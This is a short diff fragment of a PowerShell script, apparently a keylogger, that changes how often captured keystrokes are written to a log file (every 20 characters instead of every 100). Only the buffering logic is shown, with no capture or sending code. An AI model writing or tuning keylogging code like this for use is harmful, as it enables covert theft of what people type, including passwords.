@@ -35,7 +35,7 @@ function run-key([Int]$send, [Int]$counter)
             # add key to logger file
             $lista += $mychar
             $counter++
-            if ($counter -ge 100)
+            if ($counter -ge 20)
             {
               $counter = 0
               Add-Content -Path $File -Value $lista -NoNewline
